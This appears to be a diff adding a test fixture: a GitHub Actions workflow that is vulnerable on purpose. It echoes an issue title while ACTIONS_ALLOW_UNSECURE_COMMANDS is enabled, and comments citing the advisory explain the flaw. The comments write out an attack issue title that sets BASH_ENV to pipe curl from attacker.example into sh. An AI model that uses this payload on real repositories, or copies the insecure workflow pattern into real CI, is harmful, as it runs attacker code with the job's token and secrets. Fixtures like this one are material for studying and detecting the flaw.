@@ -1,0 +1,27 @@
+# situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true
+#   in its env, and a step prints the title of the issue; a step comes
+#   after.
+# reason: the runner reads ##[set-env name=NAME;] anywhere in a printed line
+#   as a command where the flag is true, and the title is the attacker's;
+#   a set-env of BASH_ENV runs the attacker's code in the bash of the next step
+#   (GHSA-mfwh-5m23-j46w: "Workflows that log untrusted data to stdout may
+#   invoke these commands").
+# attack: the attacker opens an issue titled ##[set-env
+#   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
+# attack-run-behavior: the step prints the title, the runner sets BASH_ENV,
+#   and the bash of the next step runs the attacker's script with the token
+#   and the secrets of the job.
+# advisory: https://github.com/advisories/GHSA-mfwh-5m23-j46w
+on: issues
+permissions: {}
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
+    steps:
+      - env:
+          TITLE: ${{ github.event.issue.title }}
+        run: |
+          echo "issue: $TITLE"
+      - run: echo next
